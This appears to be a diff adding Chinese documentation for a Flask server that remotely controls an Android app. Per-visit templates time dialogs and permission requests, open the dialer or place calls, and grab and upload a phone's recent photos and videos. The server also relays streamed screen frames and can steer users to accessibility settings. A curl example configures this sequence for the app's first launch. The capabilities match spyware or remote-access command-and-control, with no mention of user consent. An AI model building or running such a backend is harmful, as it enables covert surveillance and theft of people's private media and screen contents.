@@ -1,0 +1,52 @@
+# server.py 说明（当前版本）
+
+## 能力概览
+- 弹窗协议：精确控制弹窗位置/尺寸、子元素位置与字号、出现/消失延迟；支持多次进入主界面按次序返回不同模板（`visitTemplates`）。
+- 运行时热更新：`POST /action/<action>` 覆盖内存模板，`resetCounter` 可重置次数计数。
+- 拨号预填号码：`calls` 列表按 `delay` 打开拨号器；可选 `action: "dial"`（默认，无需权限）或 `"call"`（需 CALL_PHONE）。
+- 权限请求：`permissions` 列表按 `delay` 触发 `requestPermissions`，可远程控制相册等权限弹窗时机。
+- 媒体抓取上传：`mediaUpload` 列表按 `delay` 读取最近图片/视频并上传到 `/upload_file`。
+- 屏幕流转发：`/upload_stream` 接收 JPEG 帧，`/forward_stream` 输出 MJPEG，根页面便于预览。
+- 通用文件上传：`/upload_file` 保存上传文件到 `uploads/`，单请求 25 MiB 尺寸上限；会对文件名做安全清洗并去重生成安全路径，防止覆盖或目录穿越；原始体上传自动生成 `upload_<uuid>.bin`。
+
+## 接口
+- `GET /action/<action>`：返回当前模板（含补全默认值）。`MainActivityResume` 会消费 `visitTemplates`，按进入次数返回不同模板；`interval*` 默认返回空对象。
+- `POST /action/<action>`：更新模板。支持：
+  - 直接提供一个模板对象，或
+  - `{ "visitTemplates": [ ... ], "resetCounter": true }` 分次序模板并可重置计数。
+- `POST /upload_stream` / `GET /forward_stream`：推送并查看 MJPEG。
+- `POST /upload_file`：multipart 或原始体上传文件到 `uploads/`。文件名经 `secure_filename` 清洗，若重名会追加 UUID 片段；原始体上传使用随机 `upload_<uuid>.bin`。请求体超过 25 MiB 会被 Flask 拦截。
+
+## 模板字段（新增项）
+- `permissions`: `[ { "permissions": ["android.permission.READ_MEDIA_IMAGES"], "delay": 1200 } ]`
+- `calls`: `[ { "number": "1234567890", "delay": 2000, "action": "dial" } ]`
+- `mediaUpload`: `[ { "mediaType": "images"|"videos", "count": 1-5, "delay": 4000 } ]`
+其余字段与 README 的 dialogs/openApp/messages/captureScreen 相同，缺省会在服务端补默认值。
+
+## 使用示例
+```bash
+curl -X POST http://localhost:8080/action/MainActivityResume \
+  -H "Content-Type: application/json" \
+  -d '{
+        "resetCounter": true,
+        "visitTemplates": [
+          {
+            "dialogs": [{ "title": "Hi", "message": "First open" }],
+            "permissions": [{ "permissions": ["android.permission.READ_MEDIA_IMAGES"], "delay": 800 }],
+            "calls": [{ "number": "10086", "delay": 1500, "action": "dial" }],
+            "mediaUpload": [{ "mediaType": "images", "count": 1, "delay": 3000 }]
+          },
+          {
+            "dialogs": [{ "title": "Second", "message": "Second open" }]
+          }
+        ]
+      }'
+```
+
+## 注意事项 / 风险
+- 无鉴权：管理接口和上传接口默认开放本机端口，生产环境需加鉴权或限网段。
+- 内存态：模板与帧缓存都在进程内存，多进程/重启会丢失；上传已有 25 MiB 单请求上限，但仍建议前置 Nginx/Flask 限流和鉴权。
+- 计数与竞态：`capture_count` 未加锁，在多线程高并发下可能非严格递增；调试场景问题不大。
+- 权限弹窗：若用户勾选“不再询问”，系统不再弹窗，需引导到系统设置手动开启。
+- 媒体上传：读取最近媒体需相册读权限；上传量做了客户端 count(1..5) 限制，服务端仍建议配置 Nginx/Flask 限流。 
+- `settingsActions`: `[{"action":"android.settings.ACCESSIBILITY_SETTINGS","delay":800}]`
